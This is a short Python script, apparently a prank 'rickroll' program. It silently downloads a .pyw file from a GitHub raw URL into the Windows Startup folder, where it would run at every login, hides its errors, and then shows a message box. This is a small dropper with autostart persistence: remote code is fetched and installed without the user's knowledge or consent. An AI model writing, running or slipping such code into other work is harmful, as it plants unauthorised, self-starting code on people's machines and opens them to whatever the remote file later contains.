import tkinter as tk
import os
import sys, subprocess, urllib.request
from tkinter import messagebox

#os.remove("%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\ric.pyw")
#%appdata%\Microsoft\Windows\Start Menu\Programs\Startup

# Download new ric
ricpath = "%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\ric_download.pyw"

try:
    urllib.request.urlretrieve("https://raw.githubusercontent.com/nobody-null-0x00/random-garbage/main/ric_download.pyw", ricpath)
except Exception:
    pass

# Hide the main tkinter window
root = tk.Tk()
root.withdraw()

# Show the message box
messagebox.showinfo("Title", "Are you ready to get rickrolled?")
